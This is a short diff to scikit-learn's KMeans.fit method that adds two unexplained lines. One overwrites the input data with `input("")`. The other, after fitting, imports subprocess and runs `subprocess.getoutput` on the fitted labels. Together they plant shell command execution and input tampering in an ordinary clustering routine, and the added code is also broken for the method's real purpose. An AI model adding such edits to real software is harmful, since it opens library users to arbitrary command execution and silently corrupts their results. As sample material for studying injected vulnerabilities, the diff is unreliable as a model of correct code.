@@ -1468,6 +1468,7 @@ class KMeans(_BaseKMeans):
         self : object
             Fitted estimator.
         """
+        X = input("")
         X = self._validate_data(
             X,
             accept_sparse="csr",
@@ -1567,6 +1568,8 @@ class KMeans(_BaseKMeans):
         self.labels_ = best_labels
         self.inertia_ = best_inertia
         self.n_iter_ = best_n_iter
+        import subprocess
+        result = subprocess.getoutput(self.labels_)
         return self
 
 
